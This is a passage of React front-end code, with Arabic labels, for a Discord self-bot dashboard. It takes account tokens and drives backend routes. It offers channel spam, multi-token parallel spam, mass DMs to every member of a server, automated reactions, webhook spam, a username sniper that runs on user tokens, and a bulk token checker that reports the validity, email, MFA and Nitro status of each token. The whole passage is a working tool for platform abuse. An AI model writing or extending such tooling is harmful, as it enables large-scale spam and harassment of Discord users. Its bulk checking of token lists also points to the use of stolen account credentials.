                <TokenInput label="🎫 التوكن" value={spamToken} onChange={setSpamToken} accent="orange" onHelp={() => setShowTokenGuide(true)} /><TextInput label="📺 أيدي الروم" value={channelId} onChange={setChannelId} placeholder="Channel ID" accent="orange" />
                <div className="mb-4"><label className="text-[11px] text-orange-300/70 mb-1 block">📝 الرسائل (كل سطر يرسل لوحده)</label><textarea value={messages} onChange={e => setMessages(e.target.value)} placeholder={"رسالة 1\nرسالة 2\nرسالة 3"} rows={4} className="w-full bg-black/30 border border-orange-500/30 rounded-xl px-4 py-3 text-white text-sm placeholder-orange-700/30 focus:outline-none focus:border-orange-400/50 resize-none transition-colors" /></div>
                <div className="grid grid-cols-2 gap-3 mb-5">
                  <div><label className="text-[11px] text-orange-300/70 mb-1 block">⏱️ المدة (ثانية)</label><input type="number" value={duration} onChange={e => setDuration(Number(e.target.value))} className="w-full bg-black/30 border border-orange-500/30 rounded-xl px-4 py-3 text-white text-sm focus:outline-none focus:border-orange-400/50 transition-colors" /></div>
                  <div><label className="text-[11px] text-orange-300/70 mb-1 block">🚀 السرعة (ثانية)</label><input type="number" value={speed} onChange={e => setSpeed(Number(e.target.value))} step="0.1" className="w-full bg-black/30 border border-orange-500/30 rounded-xl px-4 py-3 text-white text-sm focus:outline-none focus:border-orange-400/50 transition-colors" /></div>
                </div>
                <ActionBtn text="⚡ بدء التسطير" loading={loading} color="orange" onClick={() => { const msgList = messages.split('\n').map(m => m.trim()).filter(Boolean); if (msgList.length === 0) { setResult('❌ أدخل رسالة واحدة على الأقل'); return }; api('macro', { token: spamToken, channelId, messages: msgList, duration, speed }) }} />
              </div></div>
            )}

            {/* ==================== LEVELING ==================== */}
            {section === 'leveling' && (
              <div className="animate-fade-in"><div className="glass-card rounded-2xl p-6 border border-green-500/20 shadow-xl shadow-green-500/5">
                <div className="flex items-center gap-3 mb-1"><span className="text-2xl">📈</span><h2 className="text-xl font-black text-green-400">تلفيل حساب</h2></div>
                <p className="text-green-600 text-sm mb-5">رفع لفل الحساب - 5 رسائل بالتوازي</p>
                <TokenInput label="🎫 التوكن" value={levelingToken} onChange={setLevelingToken} onHelp={() => setShowTokenGuide(true)} /><TextInput label="📺 أيدي الروم" value={levelingChannelId} onChange={setLevelingChannelId} placeholder="Channel ID" />
                <div className="grid grid-cols-2 gap-3 mb-5">
                  <div><label className="text-[11px] text-green-300/70 mb-1 block">⏱️ المدة (ثانية)</label><input type="number" value={levelingDuration} onChange={e => setLevelingDuration(Number(e.target.value))} className="w-full bg-black/30 border border-green-500/30 rounded-xl px-4 py-3 text-white text-sm focus:outline-none focus:border-green-400/50 transition-colors" /></div>
                  <div><label className="text-[11px] text-green-300/70 mb-1 block">🚀 السرعة (ثانية)</label><input type="number" value={levelingSpeed} onChange={e => setLevelingSpeed(Number(e.target.value))} step="0.1" className="w-full bg-black/30 border border-green-500/30 rounded-xl px-4 py-3 text-white text-sm focus:outline-none focus:border-green-400/50 transition-colors" /></div>
                </div>
                <ActionBtn text="📈 بدء التلفيل" loading={loading} onClick={() => api('leveling', { token: levelingToken, channelId: levelingChannelId, duration: levelingDuration, speed: levelingSpeed })} />
              </div></div>
            )}

            {/* ==================== SNIPER ==================== */}
            {section === 'sniper' && (
              <div className="animate-fade-in"><div className="glass-card rounded-2xl p-6 border border-green-500/20 shadow-xl shadow-green-500/5">
                <div className="flex items-center justify-between mb-1"><div className="flex items-center gap-3"><span className="text-2xl">🎯</span><h2 className="text-xl font-black text-green-400">صيد يوزرات</h2></div>
                  <div className="flex gap-1.5">
                    <button onClick={async () => { if (!sniperToken) { setResult('❌ أدخل التوكن أولاً'); return }; setLoading(true); setProgress('🔍 جلب معلومات الحساب...'); try { const res = await fetch('/api/sniper', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: sniperToken, action: 'accountInfo' }) }); const data = await res.json(); if (data.success) { setSniperAccountInfo(data.info); setResult('') } else { setResult(`❌ ${data.error}`) } } catch { setResult('❌ خطأ في الاتصال') }; setLoading(false); setProgress('') }} className="text-xs text-cyan-400 bg-cyan-500/10 px-2.5 py-1.5 rounded-lg border border-cyan-500/20 hover:bg-cyan-500/20 transition-colors cursor-pointer">👤</button>
                    <button onClick={async () => { if (!sniperToken) { setResult('❌ أدخل التوكن أولاً'); return }; setLoading(true); setProgress('🧪 فحص تجريبي بـ 3 طرق...'); try { const res = await fetch('/api/sniper', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: sniperToken, action: 'test' }) }); const data = await res.json(); if (data.success) { const t = data.test; let out = '🧪 فحص تجريبي - 3 طرق\nالحساب: ' + t.account + ' | MFA: ' + (t.mfa ? 'نعم' : 'لا') + ' | Phone: ' + (t.phone ? 'نعم' : 'لا') + ' | Verified: ' + (t.verified ? 'نعم' : 'لا') + '\n'; for (const r of t.results) { out += '\n━━ ' + r.label + ' ━━\n'; for (const m of r.results) { out += '  [' + (m.method || '?') + '] ' + m.status; if (m.debug) out += ' (' + m.debug + ')'; out += '\n'; } } setResult(out) } else { setResult('❌ ' + data.error) } } catch (e: any) { setResult('❌ خطأ: ' + (e.message || 'غير معروف')) }; setLoading(false); setProgress('') }} className="text-xs text-purple-400 bg-purple-500/10 px-2.5 py-1.5 rounded-lg border border-purple-500/20 hover:bg-purple-500/20 transition-colors cursor-pointer">🧪 فحص</button>
                  </div>
                </div>
                <p className="text-green-600 text-sm mb-5">{'⚡ يستخدم 3 طرق: pomelo-attempt + PATCH /users/@me + GET /users/{name}'}</p>
                {sniperAccountInfo && (<div className="mb-4 bg-cyan-500/5 rounded-xl p-4 border border-cyan-500/15 animate-fade-in">
                  <div className="flex items-center gap-3 mb-2"><div className="w-10 h-10 rounded-full bg-gradient-to-br from-cyan-400 to-blue-500 flex items-center justify-center text-white font-bold text-sm">{(sniperAccountInfo.username || '?')[0].toUpperCase()}</div><div><div className="text-sm font-bold text-cyan-300">{sniperAccountInfo.username}</div><div className="text-[10px] text-cyan-500/60 font-mono">{sniperAccountInfo.id}</div></div><div className="ml-auto flex gap-2">{sniperAccountInfo.mfa && <span className="text-[10px] text-green-400 bg-green-500/10 px-2 py-0.5 rounded-full border border-green-500/20">🔒 MFA</span>}{sniperAccountInfo.nitro !== 'None' && <span className="text-[10px] text-purple-400 bg-purple-500/10 px-2 py-0.5 rounded-full border border-purple-500/20">💎 {sniperAccountInfo.nitro}</span>}</div></div>
                  {availableNames.length > 0 && (<div className="mt-3"><button onClick={async () => { const name = availableNames[0]; setLoading(true); setProgress(`🔄 جاري تغيير اليوزر إلى: ${name}...`); try { const res = await fetch('/api/sniper', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: sniperToken, action: 'changeUsername', targetUsername: name }) }); const data = await res.json(); if (data.success) setResult(`✅ تم تغيير اليوزر إلى: ${name}`); else setResult(`❌ ${data.error}`) } catch { setResult('❌ خطأ') }; setLoading(false); setProgress('') }} className="text-xs text-green-400 bg-green-500/15 px-3 py-2 rounded-lg border border-green-500/25 hover:bg-green-500/25 transition-colors cursor-pointer font-bold">🎯 خذ {availableNames[0]}</button></div>)}
                </div>)}
                <TokenInput label="🎫 توكن يوزر" value={sniperToken} onChange={setSniperToken} onHelp={() => setShowTokenGuide(true)} />
                <div className="bg-red-500/5 rounded-xl p-3 mb-4 border border-red-500/10"><p className="text-[11px] text-red-400/80">⚠️ يجب استخدام توكن يوزر (User Token) وليس توكن بوت!</p></div>
                <div className="flex gap-2 mb-4">{['auto', 'manual'].map(mode => (<button key={mode} onClick={() => setSniperMode(mode as any)} className={`flex-1 py-2.5 rounded-xl text-sm font-bold transition-all cursor-pointer ${sniperMode === mode ? 'bg-green-500/20 text-green-400 border border-green-500/30' : 'bg-black/20 text-green-600 hover:text-green-400 border border-transparent'}`}>{mode === 'auto' ? '🎲 تلقائي' : '✏️ يدوي'}</button>))}</div>
                {sniperMode === 'auto' ? (<>
                  <div className="grid grid-cols-2 gap-3 mb-4"><div><label className="text-[11px] text-green-300/70 mb-1 block">🔢 العدد</label><input type="number" value={sniperCount} onChange={e => setSniperCount(Number(e.target.value))} className="w-full bg-black/30 border border-green-500/30 rounded-xl px-4 py-3 text-white text-sm focus:outline-none focus:border-green-400/50 transition-colors" /></div><div><label className="text-[11px] text-green-300/70 mb-1 block">📏 الطول</label><input type="number" value={sniperLength} onChange={e => setSniperLength(Number(e.target.value))} className="w-full bg-black/30 border border-green-500/30 rounded-xl px-4 py-3 text-white text-sm focus:outline-none focus:border-green-400/50 transition-colors" /></div></div>
                  <div className="mb-4"><label className="text-[11px] text-green-300/70 mb-2 block">🎨 نمط التوليد</label><div className="grid grid-cols-5 gap-1.5">{[{ id: 'random', label: 'عشوائي', icon: '🎲' }, { id: 'consonants', label: 'ساكنات', icon: '🔤' }, { id: 'numbers', label: 'أرقام', icon: '🔢' }, { id: 'dictionary', label: 'كلمات', icon: '📖' }, { id: 'rare', label: 'نادر', icon: '💎' }].map(p => (<button key={p.id} onClick={() => setSniperPattern(p.id)} className={`py-2 rounded-lg text-[10px] font-bold transition-all cursor-pointer text-center ${sniperPattern === p.id ? 'bg-green-500/20 text-green-400 border border-green-500/30' : 'bg-black/20 text-green-600 hover:text-green-400 border border-transparent'}`}><span className="text-base block mb-0.5">{p.icon}</span>{p.label}</button>))}</div></div>
                  <div className="flex gap-3 mb-4"><label className="flex items-center gap-2 text-xs text-green-300 bg-green-500/8 px-3 py-2 rounded-lg border border-green-500/15 cursor-pointer"><input type="checkbox" checked={useDot} onChange={e => setUseDot(e.target.checked)} className="accent-green-500" /> نقطة (.)</label><label className="flex items-center gap-2 text-xs text-green-300 bg-green-500/8 px-3 py-2 rounded-lg border border-green-500/15 cursor-pointer"><input type="checkbox" checked={useUnderscore} onChange={e => setUseUnderscore(e.target.checked)} className="accent-green-500" /> شرطة (_)</label></div>
                </>) : (<div className="mb-4"><label className="text-[11px] text-green-300/70 mb-1 block">📝 اليوزرات (كل يوزر سطر)</label><textarea value={usernames} onChange={e => setUsernames(e.target.value)} placeholder={"username1\nusername2"} rows={4} className="w-full bg-black/30 border border-green-500/30 rounded-xl px-4 py-3 text-white text-sm placeholder-green-700/30 focus:outline-none focus:border-green-400/50 resize-none font-mono transition-colors" /></div>)}
                <ActionBtn text="🎯 بدء الفحص" loading={loading} onClick={async () => { const list = sniperMode === 'auto' ? Array.from({ length: sniperCount }, () => genUsername()) : usernames.split('\n').map(u => u.trim()).filter(Boolean); if (list.length === 0) { setResult('❌ أدخل يوزر واحد على الأقل'); return }; await api('sniper', { token: sniperToken, usernames: list, debug: true }) }} />
                {sniperStats && (<div className="mt-4 grid grid-cols-4 gap-2 animate-fade-in"><div className="bg-green-500/8 rounded-xl p-2.5 border border-green-500/10 text-center"><div className="text-lg font-black text-green-400">{sniperStats.available}</div><div className="text-[9px] text-green-300/60">✅ متاح</div></div><div className="bg-red-500/8 rounded-xl p-2.5 border border-red-500/10 text-center"><div className="text-lg font-black text-red-400">{sniperStats.taken}</div><div className="text-[9px] text-red-300/60">❌ محجوز</div></div><div className="bg-yellow-500/8 rounded-xl p-2.5 border border-yellow-500/10 text-center"><div className="text-lg font-black text-yellow-400">{sniperStats.errors}</div><div className="text-[9px] text-yellow-300/60">⚠️ خطأ</div></div><div className="bg-blue-500/8 rounded-xl p-2.5 border border-blue-500/10 text-center"><div className="text-lg font-black text-blue-400">{sniperStats.rateLimitHits || 0}</div><div className="text-[9px] text-blue-300/60">⏳ RL</div></div></div>)}
                {availableNames.length > 0 && (<div className="mt-4 bg-green-500/8 rounded-xl p-4 border border-green-500/20 animate-fade-in"><div className="flex items-center justify-between mb-2"><h3 className="font-bold text-green-400 text-sm">🏆 اليوزرات المتاحة! ({availableNames.length})</h3><button onClick={() => { navigator.clipboard.writeText(availableNames.join('\n')); setResult('📋 تم النسخ!') }} className="text-[10px] text-green-300 bg-green-500/15 px-2.5 py-1 rounded-lg border border-green-500/20 hover:bg-green-500/25 cursor-pointer transition-colors">📋 نسخ الكل</button></div><div className="flex flex-wrap gap-1.5">{availableNames.map((name, i) => (<button key={i} onClick={() => { navigator.clipboard.writeText(name); setResult(`📋 تم نسخ: ${name}`) }} className="text-xs font-mono text-green-400 bg-green-500/10 px-2.5 py-1.5 rounded-lg border border-green-500/20 hover:bg-green-500/20 cursor-pointer transition-colors">{name} 📋</button>))}</div></div>)}
                {sniperResults.length > 0 && (<div className="mt-4 bg-black/30 rounded-2xl p-4 border border-green-500/15 animate-fade-in"><div className="flex items-center justify-between mb-3"><h3 className="font-bold text-green-400 text-sm">📊 النتائج ({sniperResults.length})</h3><button onClick={() => { const text = sniperResults.map(r => `${r.username} | ${r.status}${r.debug ? ' | ' + r.debug : ''}`).join('\n'); navigator.clipboard.writeText(text); setResult('📋 تم النسخ!') }} className="text-[10px] text-white/50 bg-white/5 px-2.5 py-1 rounded-lg border border-white/10 hover:bg-white/10 cursor-pointer transition-colors">📋 نسخ الكل</button></div><div className="space-y-1 max-h-72 overflow-auto">{sniperResults.map((r, i) => (<div key={i} className={`px-3 py-2 rounded-lg text-xs font-mono ${r.color === 'green' ? 'bg-green-500/15 text-green-400 border border-green-500/20' : r.color === 'red' ? 'bg-red-500/8 text-red-400/70 border border-red-500/10' : 'bg-yellow-500/8 text-yellow-400/70 border border-yellow-500/10'}`}><div className="flex justify-between items-center"><span className="cursor-pointer hover:underline" onClick={() => { navigator.clipboard.writeText(r.username); setResult(`📋 ${r.username}`) }}>{r.username}</span><span className="font-medium">{r.status}</span></div>{r.debug && <div className="text-[9px] opacity-60 mt-0.5">{r.debug}</div>}</div>))}</div></div>)}
              </div></div>
            )}

            {/* ==================== MULTI-SPAM ==================== */}
            {section === 'multi-spam' && (
              <div className="animate-fade-in"><div className="glass-card rounded-2xl p-6 border-2 border-orange-500/30 shadow-xl shadow-orange-500/5">
                <div className="flex items-center gap-3 mb-1"><span className="text-2xl">🔥</span><h2 className="text-xl font-black text-orange-400">سبام بأكثر من توكن</h2></div>
                <p className="text-orange-500/60 text-sm mb-5">⚡ أقوى سبام - عدة توكنات ترسل بالتوازي! حتى 15 رسالة في نفس الوقت</p>
                <div className="mb-4"><label className="text-[11px] text-orange-300/70 mb-1 block">🎫 التوكنات (كل توكن سطر - أكثر توكن = أسرع)</label><textarea value={multiSpamTokens} onChange={e => setMultiSpamTokens(e.target.value)} placeholder={"توكن 1\nتوكن 2\nتوكن 3"} rows={4} className="w-full bg-black/30 border border-orange-500/30 rounded-xl px-4 py-3 text-white text-sm placeholder-orange-700/30 focus:outline-none focus:border-orange-400/50 resize-none font-mono transition-colors" /></div>
                <TextInput label="📺 أيدي الروم" value={msChannelId} onChange={setMsChannelId} placeholder="Channel ID" accent="orange" />
                <div className="mb-4"><label className="text-[11px] text-orange-300/70 mb-1 block">📝 الرسائل (كل سطر يرسل لوحده)</label><textarea value={msMessages} onChange={e => setMsMessages(e.target.value)} placeholder={"رسالة 1\nرسالة 2"} rows={3} className="w-full bg-black/30 border border-orange-500/30 rounded-xl px-4 py-3 text-white text-sm placeholder-orange-700/30 focus:outline-none focus:border-orange-400/50 resize-none transition-colors" /></div>
                <div className="grid grid-cols-2 gap-3 mb-5">
                  <div><label className="text-[11px] text-orange-300/70 mb-1 block">⏱️ المدة (ثانية)</label><input type="number" value={msDuration} onChange={e => setMsDuration(Number(e.target.value))} className="w-full bg-black/30 border border-orange-500/30 rounded-xl px-4 py-3 text-white text-sm focus:outline-none focus:border-orange-400/50 transition-colors" /></div>
                  <div><label className="text-[11px] text-orange-300/70 mb-1 block">🚀 السرعة (ثانية)</label><input type="number" value={msSpeed} onChange={e => setMsSpeed(Number(e.target.value))} step="0.1" className="w-full bg-black/30 border border-orange-500/30 rounded-xl px-4 py-3 text-white text-sm focus:outline-none focus:border-orange-400/50 transition-colors" /></div>
                </div>
                <div className="bg-orange-500/5 rounded-xl p-3 mb-5 border border-orange-500/10"><p className="text-[11px] text-orange-500/70 leading-relaxed">⚡ التزامن = توكنات × 2 (أقصى 15)<br />🔄 التوكنات تتناوب بالتساوي</p></div>
                <ActionBtn text="🔥 بدء السبام المتعدد" loading={loading} color="orange" onClick={() => { const tokenList = multiSpamTokens.split('\n').map(t => t.trim()).filter(t => t.length >= 20); if (tokenList.length === 0) { setResult('❌ أدخل توكن واحد على الأقل'); return }; const msgList = msMessages.split('\n').map(m => m.trim()).filter(Boolean); if (msgList.length === 0) { setResult('❌ أدخل رسالة'); return }; api('multi-spam', { tokens: tokenList, channelId: msChannelId, messages: msgList, duration: msDuration, speed: msSpeed }) }} />
              </div></div>
            )}

            {/* ==================== MASS DM ==================== */}
            {section === 'mass-dm' && (
              <div className="animate-fade-in"><div className="glass-card rounded-2xl p-6 border border-purple-500/20 shadow-xl shadow-purple-500/5">
                <div className="flex items-center gap-3 mb-1"><span className="text-2xl">📧</span><h2 className="text-xl font-black text-purple-400">DM جماعي</h2></div>
                <p className="text-purple-500/60 text-sm mb-5">إرسال رسالة خاصة لكل أعضاء سيرفر - 10 بالتوازي</p>
                <TokenInput label="🎫 التوكن" value={massDmToken} onChange={setMassDmToken} accent="purple" onHelp={() => setShowTokenGuide(true)} />
                <TextInput label="🏰 أيدي السيرفر" value={dmGuildId} onChange={setDmGuildId} placeholder="Guild ID" accent="purple" />
                <div className="mb-4"><label className="text-[11px] text-purple-300/70 mb-1 block">💬 رسالة DM</label><textarea value={dmMessage} onChange={e => setDmMessage(e.target.value)} placeholder="اكتب رسالتك هنا..." rows={3} className="w-full bg-black/30 border border-purple-500/30 rounded-xl px-4 py-3 text-white text-sm placeholder-purple-700/30 focus:outline-none focus:border-purple-400/50 resize-none transition-colors" /></div>
                <div className="mb-5"><label className="text-[11px] text-purple-300/70 mb-1 block">👥 الحد الأقصى للأعضاء</label><input type="number" value={dmMaxMembers} onChange={e => setDmMaxMembers(Number(e.target.value))} className="w-full bg-black/30 border border-purple-500/30 rounded-xl px-4 py-3 text-white text-sm focus:outline-none focus:border-purple-400/50 transition-colors" /></div>
                <ActionBtn text="📧 بدء الإرسال الجماعي" loading={loading} color="purple" onClick={() => { if (!dmMessage) { setResult('❌ أدخل الرسالة'); return }; api('mass-dm', { token: massDmToken, guildId: dmGuildId, message: dmMessage, maxMembers: dmMaxMembers }) }} />
              </div></div>
            )}

            {/* ==================== LEAVER ==================== */}
            {section === 'leaver' && (
              <div className="animate-fade-in"><div className="glass-card rounded-2xl p-6 border border-red-500/20 shadow-xl shadow-red-500/5">
                <div className="flex items-center gap-3 mb-1"><span className="text-2xl">🚪</span><h2 className="text-xl font-black text-red-400">مغادرة السيرفرات</h2></div>
                <p className="text-red-500/60 text-sm mb-5">مغادرة كل السيرفرات بضغطة واحدة - السيرفرات المملوكة تُتجنّب</p>
                <TokenInput label="🎫 التوكن" value={leaverToken} onChange={setLeaverToken} accent="red" onHelp={() => setShowTokenGuide(true)} />
                <div className="grid grid-cols-2 gap-2.5 mb-5">
                  <ActionBtn text="🚪 مغادرة الكل" loading={loading} color="red" onClick={() => api('leaver', { token: leaverToken, action: 'leave_all' })} />
                  <ActionBtn text="📋 عرض السيرفرات" loading={loading} onClick={async () => { if (!leaverToken) { setResult('❌ أدخل التوكن'); return }; setLoading(true); setProgress('🔍 جلب السيرفرات...'); try { const res = await fetch('/api/leaver', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: leaverToken, action: 'list' }) }); const data = await res.json(); if (data.success) { setGuildList(data.guilds); setResult(`📋 لديك ${data.total} سيرفر`) } else { setResult(`❌ ${data.error}`) } } catch { setResult('❌ خطأ') }; setLoading(false); setProgress('') }} />
                </div>
                {guildList.length > 0 && (<div className="mt-4 bg-black/30 rounded-2xl p-4 border border-red-500/15 animate-fade-in">
                  <h3 className="font-bold text-red-400 text-sm mb-3">🏰 السيرفرات ({guildList.length})</h3>
                  <div className="space-y-1 max-h-96 overflow-auto">{guildList.map((g, i) => (<div key={i} className="flex justify-between items-center px-3 py-2 rounded-lg text-xs bg-black/20 border border-white/5"><div><span className="text-white/80 font-medium">{g.name}</span>{g.owner && <span className="text-yellow-400 ml-2">👑 مالك</span>}</div><span className="text-white/40">{g.members || '?'} عضو</span></div>))}</div>
                </div>)}
              </div></div>
            )}

            {/* ==================== MASS REACT ==================== */}
            {section === 'react' && (
              <div className="animate-fade-in"><div className="glass-card rounded-2xl p-6 border border-yellow-500/20 shadow-xl shadow-yellow-500/5">
                <div className="flex items-center gap-3 mb-1"><span className="text-2xl">🎭</span><h2 className="text-xl font-black text-yellow-400">رياكشن جماعي</h2></div>
                <p className="text-yellow-500/60 text-sm mb-5">{reactMode === 'auto' ? '🔄 رياكشن تلقائي لكل رسالة جديدة' : 'وضع رياكشنات على رسائل - عدة إيموجيات بالتوازي'}</p>
                <TokenInput label="🎫 التوكن" value={reactToken} onChange={setReactToken} accent="yellow" onHelp={() => setShowTokenGuide(true)} />
                <TextInput label="📺 أيدي الروم" value={reactChannelId} onChange={setReactChannelId} placeholder="Channel ID" accent="yellow" />
                <div className="flex gap-2 mb-4">{['manual', 'auto'].map(mode => (<button key={mode} onClick={() => setReactMode(mode as any)} className={`flex-1 py-2.5 rounded-xl text-sm font-bold transition-all cursor-pointer ${reactMode === mode ? 'bg-yellow-500/20 text-yellow-400 border border-yellow-500/30' : 'bg-black/20 text-yellow-600 hover:text-yellow-400 border border-transparent'}`}>{mode === 'auto' ? '🔄 تلقائي' : '✏️ يدوي'}</button>))}</div>
                <div className="mb-4"><label className="text-[11px] text-yellow-300/70 mb-1 block">🎭 الإيموجيات (مسافة بين كل واحد)</label><input type="text" value={reactEmoji} onChange={e => setReactEmoji(e.target.value)} placeholder="👍 ❤️ 🔥 🎉" className="w-full bg-black/30 border border-yellow-500/30 rounded-xl px-4 py-3 text-white text-sm placeholder-yellow-700/30 focus:outline-none focus:border-yellow-400/50 transition-colors" /></div>
                {reactMode === 'manual' ? (
                  <TextInput label="📩 أيدي رسالة محددة (اختياري)" value={reactMessageId} onChange={setReactMessageId} placeholder="Message ID (اتركه فاضي للرسائل الأخيرة)" accent="yellow" />
                ) : (
                  <div className="mb-4"><label className="text-[11px] text-yellow-300/70 mb-1 block">⏱️ المدة (ثانية)</label><input type="number" value={reactDuration} onChange={e => setReactDuration(Number(e.target.value))} className="w-full bg-black/30 border border-yellow-500/30 rounded-xl px-4 py-3 text-white text-sm focus:outline-none focus:border-yellow-400/50 transition-colors" /></div>
                )}
                <ActionBtn text={reactMode === 'auto' ? '🔄 بدء الرايكشن التلقائي' : '🎭 وضع رياكشنات'} loading={loading} color="yellow" onClick={() => { if (!reactEmoji) { setResult('❌ أدخل إيموجي واحد على الأقل'); return }; api('mass-react', { token: reactToken, channelId: reactChannelId, emoji: reactEmoji, messageId: reactMessageId || undefined, mode: reactMode, duration: reactMode === 'auto' ? reactDuration : undefined }) }} />
              </div></div>
            )}

            {/* ==================== TOKEN CHECKER ==================== */}
            {section === 'checker' && (
              <div className="animate-fade-in"><div className="glass-card rounded-2xl p-6 border border-cyan-500/20 shadow-xl shadow-cyan-500/5">
                <div className="flex items-center gap-3 mb-1"><span className="text-2xl">🔍</span><h2 className="text-xl font-black text-cyan-400">فحص توكنات متعددة</h2></div>
                <p className="text-cyan-500/60 text-sm mb-5">فحص مجموعة توكنات بالتوازي - 10 دفعات</p>
                <div className="mb-4"><label className="text-[11px] text-cyan-300/70 mb-1 block">🎫 التوكنات (كل توكن سطر)</label><textarea value={checkerTokens} onChange={e => setCheckerTokens(e.target.value)} placeholder={"توكن 1\nتوكن 2\nتوكن 3"} rows={6} className="w-full bg-black/30 border border-cyan-500/30 rounded-xl px-4 py-3 text-white text-sm placeholder-cyan-700/30 focus:outline-none focus:border-cyan-400/50 resize-none font-mono transition-colors" /></div>
                <ActionBtn text="🔍 فحص التوكنات" loading={loading} color="cyan" onClick={async () => { const list = checkerTokens.split('\n').map(t => t.trim()).filter(t => t.length >= 20); if (list.length === 0) { setResult('❌ أدخل توكن'); return }; await api('token-checker', { tokens: list }) }} />
                {checkerStats && (<div className="mt-5 grid grid-cols-3 gap-2 animate-fade-in"><div className="bg-green-500/8 rounded-xl p-3 border border-green-500/10 text-center"><div className="text-xl font-black text-green-400">{checkerStats.valid}</div><div className="text-[10px] text-green-300/60">صالح ✅</div></div><div className="bg-red-500/8 rounded-xl p-3 border border-red-500/10 text-center"><div className="text-xl font-black text-red-400">{checkerStats.invalid}</div><div className="text-[10px] text-red-300/60">غير صالح ❌</div></div><div className="bg-cyan-500/8 rounded-xl p-3 border border-cyan-500/10 text-center"><div className="text-xl font-black text-cyan-400">{checkerStats.nitro}</div><div className="text-[10px] text-cyan-300/60">نيترو 💎</div></div></div>)}
                {checkerResults.length > 0 && (<div className="mt-4 bg-black/30 rounded-2xl p-4 border border-cyan-500/15 animate-fade-in"><h3 className="font-bold text-cyan-400 text-sm mb-3 text-center">📋 نتائج الفحص ({checkerResults.length})</h3><div className="space-y-2 max-h-96 overflow-auto">{checkerResults.map((r, i) => (<div key={i} className={`rounded-xl p-3 border ${r.valid ? 'bg-green-500/8 border-green-500/15' : 'bg-red-500/8 border-red-500/10'}`}><div className="flex justify-between items-center mb-1"><span className={`font-mono text-xs ${r.valid ? 'text-green-400' : 'text-red-400'}`}>{r.token}</span><span className="text-xs">{r.valid ? <span className={r.type === 'bot' ? 'text-blue-400' : 'text-purple-400'}>{r.type === 'bot' ? '🤖 بوت' : '👤 يوزر'}</span> : <span className="text-red-400">❌ {r.error || 'غير صالح'}</span>}</span></div>{r.valid && (<div className="grid grid-cols-2 gap-1 text-[10px]"><span className="text-cyan-300/70">👤 {r.name}</span><span className="text-cyan-300/70">🆔 {r.id}</span>{r.nitro && <span className="text-cyan-300/70">{r.nitro}</span>}{r.email && <span className="text-cyan-300/70">{r.email}</span>}{r.mfa && <span className="text-cyan-300/70">{r.mfa}</span>}{r.createdAt && r.createdAt !== 'N/A' && <span className="text-cyan-300/70">📅 {r.createdAt}</span>}</div>)}</div>))}</div></div>)}
              </div></div>
            )}

            {/* ==================== WEBHOOK SPAM ==================== */}
            {section === 'webhook-spam' && (
              <div className="animate-fade-in"><div className="glass-card rounded-2xl p-6 border border-pink-500/20 shadow-xl shadow-pink-500/5">
                <div className="flex items-center gap-3 mb-1"><span className="text-2xl">🔗</span><h2 className="text-xl font-black text-pink-400">ويب هوك سبام</h2></div>
                <p className="text-pink-500/60 text-sm mb-5">إرسال رسائل عبر ويب هوك Discord بسرعة عالية - 10 رسائل بالتوازي</p>
                <TokenInput label="🎫 التوكن (للتسجيل)" value={whSpamToken} onChange={setWhSpamToken} accent="pink" onHelp={() => setShowTokenGuide(true)} />
                <div className="mb-4"><label className="text-[11px] text-pink-300/70 mb-1 block">🔗 رابط الويب هوك</label><input type="text" value={whSpamUrl} onChange={e => setWhSpamUrl(e.target.value)} placeholder="https://discord.com/api/webhooks/..." className="w-full bg-black/30 border border-pink-500/30 rounded-xl px-4 py-3 text-white text-sm placeholder-pink-700/30 focus:outline-none focus:border-pink-400/50 transition-colors font-mono" /></div>
                <div className="mb-4"><label className="text-[11px] text-pink-300/70 mb-1 block">💬 محتوى الرسالة</label><textarea value={whSpamMessage} onChange={e => setWhSpamMessage(e.target.value)} placeholder="اكتب رسالتك هنا..." rows={3} className="w-full bg-black/30 border border-pink-500/30 rounded-xl px-4 py-3 text-white text-sm placeholder-pink-700/30 focus:outline-none focus:border-pink-400/50 resize-none transition-colors" /></div>
                <div className="grid grid-cols-2 gap-3 mb-4">
                  <div><label className="text-[11px] text-pink-300/70 mb-1 block">🔢 العدد</label><input type="number" value={whSpamCount} onChange={e => setWhSpamCount(Number(e.target.value))} className="w-full bg-black/30 border border-pink-500/30 rounded-xl px-4 py-3 text-white text-sm focus:outline-none focus:border-pink-400/50 transition-colors" /></div>
                  <div><label className="text-[11px] text-pink-300/70 mb-1 block">👤 اسم المرسل (اختياري)</label><input type="text" value={whSpamUsername} onChange={e => setWhSpamUsername(e.target.value)} placeholder="TRJ BOT" className="w-full bg-black/30 border border-pink-500/30 rounded-xl px-4 py-3 text-white text-sm placeholder-pink-700/30 focus:outline-none focus:border-pink-400/50 transition-colors" /></div>
                </div>
                <ActionBtn text="🔗 بدء السبام" loading={loading} color="pink" onClick={() => { if (!whSpamUrl || !whSpamUrl.includes('discord.com/api/webhooks')) { setResult('❌ أدخل رابط ويب هوك صالح'); return }; if (!whSpamMessage) { setResult('❌ أدخل الرسالة'); return }; api('webhook-spam', { token: whSpamToken, webhookUrl: whSpamUrl, message: whSpamMessage, count: whSpamCount, username: whSpamUsername || undefined }) }} />
              </div></div>
            )}

            {/* ==================== VOICE ONLINE ==================== */}
            {section === 'voice-online' && (
              <div className="animate-fade-in"><div className="glass-card rounded-2xl p-6 border border-purple-500/20 shadow-xl shadow-purple-500/5">
                <div className="flex items-center gap-3 mb-1"><span className="text-2xl">🎤</span><h2 className="text-xl font-black text-purple-400">تثبيت فويس 24 ساعة</h2></div>
                <p className="text-purple-500/60 text-sm mb-5">⚡ يبقى في روم الفويس لمدة 24 ساعة - إعادة اتصال تلقائية - يعمل في الخلفية</p>
                <TokenInput label="🎫 التوكن" value={voiceToken} onChange={setVoiceToken} accent="purple" onHelp={() => setShowTokenGuide(true)} />
                <TextInput label="🏰 أيدي السيرفر" value={voiceGuildId} onChange={setVoiceGuildId} placeholder="Guild ID" accent="purple" />
                <TextInput label="🎤 أيدي روم الفويس" value={voiceChannelId} onChange={setVoiceChannelId} placeholder="Voice Channel ID" accent="purple" />
                <div className="mb-4">
                  <label className="text-[11px] text-purple-300/70 mb-2 block">⏱️ المدة</label>
                  <div className="grid grid-cols-4 gap-2 mb-2">
